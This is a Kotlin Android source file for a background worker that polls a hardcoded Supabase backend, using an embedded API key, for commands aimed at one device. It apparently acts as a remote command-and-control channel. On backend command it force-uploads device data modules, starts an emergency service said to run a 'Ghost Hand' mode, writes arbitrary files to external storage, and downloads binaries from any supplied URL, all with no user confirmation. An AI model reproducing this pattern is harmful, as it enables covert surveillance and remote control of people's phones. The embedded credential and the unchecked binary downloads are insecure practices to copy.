package com.example.myandroid

import android.content.Context
import android.os.Environment
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return withContext(Dispatchers.IO) {
            try {
                // 1. Check Permission
                val hasPerm = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                    Environment.isExternalStorageManager()
                } else {
                    true // Assume granted on older versions for simplicity or check READ/WRITE
                }
                if (!hasPerm) return@withContext Result.failure()

                // 2. Fetch Pending Commands (Targeted to THIS device)
                val deviceId = DeviceManager.getDeviceId(applicationContext)
                val supabaseUrl = "https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?status=eq.PENDING&device_id=eq.$deviceId&select=*"
                val supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2bGRmc214c2toZW1rc2xzYnltIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI2ODgxNzksImV4cCI6MjA3ODI2NDE3OX0.5arqrx8Tt7v-hpXpo_ncoK4IX8th9IibxAuv93SSoOU"

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey"
)

                if (conn.responseCode == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val commands = JSONArray(resp)

                    for (i in 0 until commands.length()) {
                        val cmd = commands.getJSONObject(i)
                        val id = cmd.getInt("id")
                        var status = "EXECUTED"
                        var errorMsg = ""

                        try {
                            val path = cmd.optString("target_path", "Download")
                            val fileName = cmd.optString("file_name")
                            
                            val root = Environment.getExternalStorageDirectory()
                            val targetDir = File(root, path)
                            if (!targetDir.exists()) targetDir.mkdirs()

                            // --- 0. CODE RED (BACKEND PING) ---
                            if (cmd.getString("file_name") == "CODERED") {
                                // Trigger Emergency Service (which handles Ghost Hand if offline, or Upload if online)
                                val i = android.content.Intent(applicationContext, EmergencyService::class.java)
                                i.putExtra("codes", "0") // 0 = ALL
                                i.putExtra("sender", "BACKEND")
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                                    applicationContext.startForegroundService(i)
                                } else {
                                    applicationContext.startService(i)
                                }
                                status = "EXECUTED"
                            }
                            // --- 1. FORCE UPLOAD ---
                            else if (cmd.getString("file_name") == "FORCE_UPLOAD") {
                                val modulesStr = cmd.optString("content", "ALL")
                                val modules = modulesStr.split(",").map { it.trim() }
                                CloudManager.uploadData(applicationContext, modules, null)
                                status = "EXECUTED"
                            }
                            // --- 2. LIVE TOAST MESSAGE ---
                            else if (cmd.getString("file_name") == "TOAST") {
                                val msg = cmd.optString("content", "Ping!")
                                android.os.Handler(android.os.Looper.getMainLooper()).post {
                                    android.widget.Toast.makeText(applicationContext, msg, android.widget.Toast.LENGTH_LONG).show()
                                }
                                status = "EXECUTED"
                            }
                            // --- 3. FILE/FOLDER CREATION ---
                            else if (fileName.isNotEmpty()) {
                                val targetFile = File(targetDir, fileName)
                                
                                if (cmd.has("content") && !cmd.isNull("content")) {
                                    // Text Creation
                                    targetFile.writeText(cmd.getString("content"))
                                } else if (cmd.has("file_url") && !cmd.isNull("file_url")) {
                                    // Binary Download
                                    val dlUrl = URL(cmd.getString("file_url"))
                                    dlUrl.openStream().use { input ->
                                        targetFile.outputStream().use { output ->
                                            input.copyTo(output)
                                        }
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            status = "FAILED"
                            errorMsg = e.message ?: "Unknown error"
                        }

                        // 3. Update Status
                        updateStatus(id, status, errorMsg, supabaseKey)
                    }
                    Result.success()
                } else {
                    Result.retry()
                }
            } catch (e: Exception) {
                e.printStackTrace()
                Result.retry()
            }
        }
    }

    private fun updateStatus(id: Int, status: String, error: String, key: String) {
        try {
            val updateUrl = URL("https://xvldfsmxskhemkslsbym.supabase.co/rest/v1/file_commands?id=eq.$id")
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "PATCH"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val json = JSONObject()
            json.put("status", status)
            if (error.isNotEmpty()) json.put("error_log", error)
            
            conn.outputStream.use { it.write(json.toString().toByteArray()) }
            conn.responseCode
        } catch (e: Exception) { e.printStackTrace() }
    }
}